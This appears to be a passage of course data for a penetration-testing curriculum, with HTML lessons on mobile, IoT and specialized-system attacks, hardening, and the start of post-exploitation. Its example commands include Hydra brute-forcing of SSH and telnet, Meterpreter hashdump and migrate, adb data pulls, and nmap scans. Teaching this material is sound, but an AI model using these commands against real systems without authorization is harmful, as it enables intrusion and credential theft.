                        <code class="text-green-400 block font-mono text-sm">docker images</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">LinPEAS</h4>
                  <p class="text-gray-300 mb-4">Used for privilege escalation detection inside VMs or containers.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code>
                        <code class="text-green-400 block font-mono text-sm">chmod +x linpeas.sh</code>
                        <code class="text-green-400 block font-mono text-sm">./linpeas.sh</code>
                        <code class="text-green-400 block font-mono text-sm">./linpeas.sh > linpeas_report.txt</code>
                        <code class="text-green-400 block font-mono text-sm">grep "HIGH" linpeas_report.txt</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Mobile OS Vulnerabilities (Android/iOS)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Mobile OS Vulnerabilities (Android / iOS)</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Mobile operating systems like Android and iOS are widely used and constantly connected, making them attractive targets for attackers. Mobile vulnerabilities often arise from insecure apps, permission misuse, OS flaws, and unsafe user behavior rather than core OS bugs alone.
            </p>
            <p class="text-gray-300">
              Android is more customizable and open, which increases flexibility but also expands the attack surface. iOS is more restricted, but misconfigurations, jailbreaking, and social engineering still introduce risk.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Android Vulnerabilities</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Malicious applications:</strong> Apps containing spyware, trojans, or backdoors.</li>
                  <li><strong>Excessive permissions:</strong> Apps requesting access beyond their functionality.</li>
                  <li><strong>Insecure local storage:</strong> Sensitive data stored unencrypted.</li>
                  <li><strong>Outdated OS versions:</strong> Unpatched vulnerabilities.</li>
                  <li><strong>ADB exposure:</strong> Debugging enabled on production devices.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common iOS Vulnerabilities</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Jailbroken devices:</strong> Bypassing Apple security controls.</li>
                  <li><strong>Insecure app transport:</strong> Lack of SSL pinning.</li>
                  <li><strong>Keychain misconfigurations:</strong> Improper credential storage.</li>
                  <li><strong>Configuration profile abuse:</strong> Malicious MDM profiles.</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Attack Flow Example</h3>
              <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                <li>User installs a malicious app.</li>
                <li>App requests excessive permissions.</li>
                <li>Sensitive data is accessed or exfiltrated.</li>
                <li>Attacker gains long-term access or control.</li>
              </ol>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                A flashlight app secretly collected contacts and location data, selling it to third parties.
              </p>
            </div>

            <div class="bg-blue-900/20 border-l-4 border-blue-500 p-4 mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Key Takeaway</h3>
              <p class="text-gray-300">
                Mobile security depends heavily on app behavior, permissions, and user awareness. Regular updates, permission control, and app analysis are essential defenses.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Mobile Security',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use only in authorized mobile security labs.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">ADB (Android Debug Bridge)</h4>
                  <p class="text-gray-300 mb-4">Used for Android device analysis and security testing.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">adb devices</code>
                        <code class="text-green-400 block font-mono text-sm">adb shell</code>
                        <code class="text-green-400 block font-mono text-sm">adb shell pm list packages</code>
                        <code class="text-green-400 block font-mono text-sm">adb pull /data/data/com.target.app/</code>
                        <code class="text-green-400 block font-mono text-sm">adb shell getprop ro.build.version.release</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">MobSF (Mobile Security Framework)</h4>
                  <p class="text-gray-300 mb-4">Used for static and dynamic mobile app analysis.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">./run.sh</code>
                        <code class="text-green-400 block font-mono text-sm"># Access dashboard at http://127.0.0.1:8000</code>
                        <code class="text-green-400 block font-mono text-sm"># Upload APK or IPA file via web interface</code>
                        <code class="text-green-400 block font-mono text-sm"># Perform Static Scan</code>
                        <code class="text-green-400 block font-mono text-sm"># Download PDF/HTML report</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'IoT Device Exploitation Basics',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">IoT Device Exploitation Basics</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Internet of Things (IoT) devices include smart cameras, routers, sensors, smart TVs, industrial controllers, and home automation devices. These devices often prioritize functionality and cost over security, making them easy targets for attackers.
            </p>
            <p class="text-gray-300">
              IoT exploitation usually focuses on weak authentication, outdated firmware, exposed services, and insecure communication protocols.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common IoT Vulnerabilities</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Default or hardcoded credentials:</strong> Many devices ship with predictable usernames and passwords.</li>
                  <li><strong>Outdated firmware:</strong> Vendors rarely push timely security patches.</li>
                  <li><strong>Exposed network services:</strong> Telnet, SSH, HTTP running openly.</li>
                  <li><strong>Insecure protocols:</strong> Plaintext communication (MQTT, HTTP).</li>
                  <li><strong>Lack of monitoring:</strong> No logging or intrusion detection.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common IoT Exploitation Techniques</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Credential brute forcing</li>
                  <li>Firmware extraction and analysis</li>
                  <li>Exploiting exposed web interfaces</li>
                  <li>Botnet recruitment</li>
                  <li>Remote command execution</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Attack Flow Example</h3>
              <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                <li>Attacker scans for IoT devices.</li>
                <li>Identifies default credentials.</li>
                <li>Gains access to device shell or UI.</li>
                <li>Installs malware or botnet agent.</li>
                <li>Uses device for DDoS or spying.</li>
              </ol>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                The Mirai botnet exploited default credentials in IoT devices to launch massive DDoS attacks.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for IoT Exploitation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use strictly in authorized IoT security labs.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Nmap</h4>
                  <p class="text-gray-300 mb-4">Used for discovering IoT devices and exposed services.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">nmap 192.168.0.0/24</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -p 21,22,23,80,443,554,1883 192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -sV -O 192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -A 192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -oN iot_scan.txt 192.168.0.50</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Hydra</h4>
                  <p class="text-gray-300 mb-4">Used for testing weak credentials on IoT services.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">hydra -l admin -P passwords.txt ssh://192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">hydra -L users.txt -P passwords.txt telnet://192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">hydra -l admin -P passwords.txt http-get://192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">hydra -t 4 -l admin -P passwords.txt ssh://192.168.0.50</code>
                        <code class="text-green-400 block font-mono text-sm">hydra -o hydra_iot_results.txt -l admin -P passwords.txt ssh://192.168.0.50</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Common Attacks on Specialized Systems',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Common Attacks on Specialized Systems</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Specialized systems include industrial control systems (ICS), SCADA, medical devices, POS systems, ATMs, smart vehicles, and embedded systems. These systems are designed for reliability and real-time operation, not frequent security updates, making them attractive targets.
            </p>
            <p class="text-gray-300">
              Attacks on specialized systems can cause physical damage, service disruption, financial loss, and safety risks, not just data breaches.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Specialized Systems</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Industrial Control Systems:</strong> ICS / SCADA.</li>
                  <li><strong>Medical devices:</strong> Pacemakers, imaging systems.</li>
                  <li><strong>Point-of-Sale (POS):</strong> Retail payment terminals.</li>
                  <li><strong>ATMs:</strong> Banking kiosks.</li>
                  <li><strong>Smart vehicles:</strong> EV charging systems, ECUs.</li>
                  <li><strong>Embedded systems:</strong> Manufacturing controllers.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Common Attack Types</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Protocol abuse:</strong> Exploiting insecure protocols like Modbus, DNP3, CAN.</li>
                  <li><strong>Default credentials:</strong> Hardcoded passwords in devices.</li>
                  <li><strong>Firmware tampering:</strong> Replacing legitimate firmware with malicious versions.</li>
                  <li><strong>Physical access attacks:</strong> USB, serial port, or JTAG exploitation.</li>
                  <li><strong>Supply chain attacks:</strong> Compromised updates or components.</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Attack Flow Example</h3>
              <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                <li>Attacker gains network or physical access.</li>
                <li>Enumerates specialized device.</li>
                <li>Exploits protocol or authentication weakness.</li>
                <li>Manipulates device behavior.</li>
                <li>Causes disruption or damage.</li>
              </ol>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                The Stuxnet worm targeted industrial PLCs, causing physical damage while hiding its presence.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Specialized Systems',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use only in authorized industrial and lab environments.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Metasploit Framework</h4>
                  <p class="text-gray-300 mb-4">Used to test vulnerabilities in specialized systems.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">msfconsole</code>
                        <code class="text-green-400 block font-mono text-sm">search scada</code>
                        <code class="text-green-400 block font-mono text-sm">use auxiliary/scanner/scada/modbusdetect</code>
                        <code class="text-green-400 block font-mono text-sm">set RHOSTS 192.168.1.100</code>
                        <code class="text-green-400 block font-mono text-sm">run</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Wireshark</h4>
                  <p class="text-gray-300 mb-4">Used to analyze specialized system protocols.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">wireshark</code>
                        <code class="text-green-400 block font-mono text-sm"># Capture traffic on interface</code>
                        <code class="text-green-400 block font-mono text-sm"># Filter Modbus: modbus</code>
                        <code class="text-green-400 block font-mono text-sm"># Filter CAN bus: can</code>
                        <code class="text-green-400 block font-mono text-sm"># File → Export Specified Packets</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Securing Cloud & IoT',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Securing Cloud & IoT</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Securing Cloud and IoT environments requires a defense-in-depth approach, combining identity control, network security, monitoring, and regular updates. Since these systems are always online, prevention, detection, and response must work together.
            </p>
            <p class="text-gray-300">
              Cloud and IoT security failures usually happen due to misconfiguration, weak authentication, and lack of visibility rather than advanced exploits.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Key Cloud Security Practices</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Strong IAM policies:</strong> Apply least privilege and role-based access control.</li>
                  <li><strong>Multi-Factor Authentication (MFA):</strong> Mandatory for admin and sensitive accounts.</li>
                  <li><strong>Secure storage configuration:</strong> Disable public access unless explicitly required.</li>
                  <li><strong>Encryption:</strong> Encrypt data at rest and in transit.</li>
                  <li><strong>Continuous monitoring:</strong> Enable logging and alerting.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Key IoT Security Practices</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Change default credentials.</li>
                  <li>Regular firmware updates.</li>
                  <li>Network segmentation.</li>
                  <li>Disable unnecessary services.</li>
                  <li>Monitor device behavior.</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Defense Strategy Example</h3>
              <ol class="list-decimal pl-5 space-y-1 text-gray-300">
                <li>Restrict access using IAM.</li>
                <li>Monitor logs and network traffic.</li>
                <li>Detect anomalies early.</li>
                <li>Respond and isolate compromised assets.</li>
              </ol>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                An organization implemented MFA and logging, reducing phishing-based cloud breaches by over 90%.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Security Hardening',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Commands shown for security hardening validation and audits.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Lynis</h4>
                  <p class="text-gray-300 mb-4">Used for system hardening audits.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">lynis audit system</code>
                        <code class="text-green-400 block font-mono text-sm">lynis audit system --quick</code>
                        <code class="text-green-400 block font-mono text-sm">grep "Suggestion" /var/log/lynis.log</code>
                        <code class="text-green-400 block font-mono text-sm">grep "Warning" /var/log/lynis.log</code>
                        <code class="text-green-400 block font-mono text-sm">lynis show report</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">OpenSCAP</h4>
                  <p class="text-gray-300 mb-4">Used for compliance and configuration checks.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Usage</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">apt install openscap-scanner -y</code>
                        <code class="text-green-400 block font-mono text-sm">oscap oval eval --results scan.xml /usr/share/xml/scap/ssg/content/ssg-ubuntu.xml</code>
                        <code class="text-green-400 block font-mono text-sm">oscap oval generate report scan.xml > scan.html</code>
                        <code class="text-green-400 block font-mono text-sm">oscap xccdf eval --profile cis /usr/share/xml/scap/ssg/content/ssg-ubuntu.xml</code>
                        <code class="text-green-400 block font-mono text-sm">firefox scan.html</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Summary',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Summary</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Module 7 covered Cloud, Mobile, and IoT Security, focusing on the threats, vulnerabilities, attacks, and defenses in modern connected environments. Key takeaways:
            </p>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Cloud Security</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Risks:</strong> Misconfigurations, weak IAM policies, exposed APIs, and metadata abuse.</li>
                  <li><strong>Vectors:</strong> Exposed storage, credential theft, and cloud service abuse.</li>
                  <li><strong>Tools:</strong> ScoutSuite and Prowler for assessment.</li>
                </ul>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Container & VM Security</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Containers:</strong> Share host kernel; misconfiguration allows container escapes.</li>
                  <li><strong>VMs:</strong> Vulnerable via exposed ports or hypervisor flaws.</li>
                  <li><strong>Tools:</strong> Docker CLI and LinPEAS for detection.</li>
                </ul>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Mobile Security</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Vulnerabilities:</strong> Malicious apps, permissions abuse, outdated OS (Android/iOS).</li>
                  <li><strong>Tools:</strong> ADB and MobSF for analysis.</li>
                </ul>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">IoT Security</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Weaknesses:</strong> Weak credentials, outdated firmware, exposed services.</li>
                  <li><strong>Tools:</strong> Nmap and Hydra for enumeration.</li>
                </ul>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Specialized Systems</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Targets:</strong> Industrial, medical, POS, embedded systems (cyber-physical threats).</li>
                  <li><strong>Tools:</strong> Metasploit and Wireshark for protocol abuse detection.</li>
                </ul>
              </div>

              <div class="bg-blue-900/20 border-l-4 border-blue-500 p-4">
                <h3 class="text-lg font-semibold mb-2 text-white">Defensive Measures</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li>Implement least privilege IAM, MFA, encryption, monitoring, and auditing.</li>
                  <li>Regular updates and secure configurations are mandatory.</li>
                  <li>Security awareness and vulnerability assessments reduce risk.</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Key Takeaway</h3>
              <p class="text-gray-300">
                Cloud, Mobile, and IoT systems are highly interconnected and always exposed. Security relies on proactive configuration, monitoring, and awareness rather than reactive fixes. Continuous auditing, proper access controls, and user training are essential to prevent breaches.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Review Tools (Nmap & Lynis)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Nmap</h4>
                  <p class="text-gray-300 mb-4">For general discovery and vulnerability assessment.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Scan Commands</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">nmap -sV 192.168.1.0/24</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -p 21,22,23,80,443,1883 192.168.1.50</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -O -A 192.168.1.50</code>
                        <code class="text-green-400 block font-mono text-sm">nmap -oN full_scan.txt 192.168.1.0/24</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Lynis</h4>
                  <p class="text-gray-300 mb-4">For system and configuration hardening.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Audit Commands</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">lynis audit system</code>
                        <code class="text-green-400 block font-mono text-sm">lynis audit system --quick</code>
                        <code class="text-green-400 block font-mono text-sm">grep "Suggestion" /var/log/lynis.log</code>
                        <code class="text-green-400 block font-mono text-sm">grep "Warning" /var/log/lynis.log</code>
                        <code class="text-green-400 block font-mono text-sm">lynis show report</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
    ]
  },
  {
    id: 'module-8',
    title: 'Module 8: Post-Exploitation Techniques',
    duration: '1 week',
    description: 'Learn what to do after compromising a system: escalation, persistence, and lateral movement.',
    lessons: [
      {
        title: 'Introduction to Post-Exploitation',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction to Post-Exploitation</h2>
          <div class="space-y-4">
            <p class="text-gray-300">
              Post-exploitation refers to the phase after an attacker gains initial access to a system. The goal is no longer entry, but to expand control, extract value, and maintain access while avoiding detection.
            </p>
            <p class="text-gray-300">
              This phase is critical because most real-world damage happens after exploitation, not during the initial breach.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Objectives</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Understand the system:</strong> Gather OS, user, and network info.</li>
                  <li><strong>Escalate privileges:</strong> Gain Admin/Root access.</li>
                  <li><strong>Harvest credentials:</strong> Steal passwords and hashes.</li>
                  <li><strong>Move laterally:</strong> Access other systems in the network.</li>
                  <li><strong>Maintain persistence:</strong> Ensure re-entry after reboot.</li>
                  <li><strong>Avoid detection:</strong> Clean logs and hide processes.</li>
                </ul>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold mb-2 text-white">Environment Variations</h3>
                <ul class="list-disc pl-5 space-y-1 text-gray-300">
                  <li><strong>Windows/AD:</strong> Focus on domain dominance.</li>
                  <li><strong>Linux:</strong> Focus on SSH keys and cron jobs.</li>
                  <li><strong>Cloud:</strong> Focus on IAM roles and metadata.</li>
                  <li><strong>Containers/VMs:</strong> Focus on escapes and host access.</li>
                </ul>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">Attack Lifecycle Position</h3>
              <div class="flex flex-wrap gap-2 text-sm text-gray-400">
                <span>Initial Access</span>
                <span class="text-gray-600">→</span>
                <span>Exploitation</span>
                <span class="text-gray-600">→</span>
                <span class="text-blue-400 font-semibold">Post-Exploitation</span>
                <span class="text-gray-600">→</span>
                <span>Lateral Movement</span>
                <span class="text-gray-600">→</span>
                <span>Data Exfiltration</span>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
              <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
              <p class="text-gray-300">
                An attacker gains access to a user machine via phishing, escalates privileges, dumps credentials, and compromises the domain controller within hours.
              </p>
            </div>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tools for Post-Exploitation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Commands shown are for authorized penetration testing labs only.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Metasploit Framework</h4>
                  <p class="text-gray-300 mb-4">Used for managing sessions and post-exploitation modules.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Session Management</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">msfconsole</code>
                        <code class="text-green-400 block font-mono text-sm">sessions</code>
                        <code class="text-green-400 block font-mono text-sm">sessions -i 1</code>
                        <code class="text-green-400 block font-mono text-sm">sysinfo</code>
                        <code class="text-green-400 block font-mono text-sm">show post</code>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Meterpreter</h4>
                  <p class="text-gray-300 mb-4">Used for advanced post-exploitation control.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic Commands</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">getuid</code>
                        <code class="text-green-400 block font-mono text-sm">ps</code>
                        <code class="text-green-400 block font-mono text-sm">migrate 1234</code>
                        <code class="text-green-400 block font-mono text-sm">screenshot</code>
                        <code class="text-green-400 block font-mono text-sm">hashdump</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Privilege Escalation Basics',
        content: `
          <div class="space-y-6">
            <div class="mb-6">
              <h2 class="text-xl font-semibold text-white mb-2">Privilege Escalation Basics</h2>
              <p class="text-gray-300">
                Privilege Escalation is the process of moving from a low-privileged account (user, service, www-data) to a higher-privileged account (Administrator / root).
              </p>
              <p class="text-gray-300 mt-2">
                In real attacks, initial access is almost always low privilege. Escalation is what converts “access” into full system control.
              </p>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-4">Types of Privilege Escalation</h3>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">1. Vertical Privilege Escalation</h4>
                  <p class="text-gray-400 text-sm">Gaining higher privileges than intended.</p>
                  <p class="text-green-400 text-xs mt-1 font-mono">Example: user → root / administrator</p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">2. Horizontal Privilege Escalation</h4>
                  <p class="text-gray-400 text-sm">Accessing another user’s data with the same privilege level.</p>
                  <p class="text-green-400 text-xs mt-1 font-mono">Example: userA → userB</p>
                </div>
              </div>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-4">Common Privilege Escalation Vectors</h3>
              <ul class="list-disc pl-5 space-y-2 text-gray-300">
                <li>Misconfigured SUID / SGID binaries</li>
                <li>Weak file & folder permissions</li>
                <li>Vulnerable kernel versions</li>
                <li>Insecure services running as root</li>
                <li>Stored credentials (config files, scripts)</li>
                <li>Cron jobs & scheduled tasks</li>
                <li>Environment variable abuse</li>
              </ul>
            </div>
            
            <div class="bg-[#1e1e1e] p-6 rounded border border-[#333]">
               <h3 class="text-lg font-semibold text-white mb-4">Privilege Escalation Workflow</h3>
               <ol class="list-decimal pl-5 space-y-2 text-gray-300">
                  <li>Enumerate system information</li>
                  <li>Identify misconfigurations</li>
                  <li>Exploit weaknesses</li>
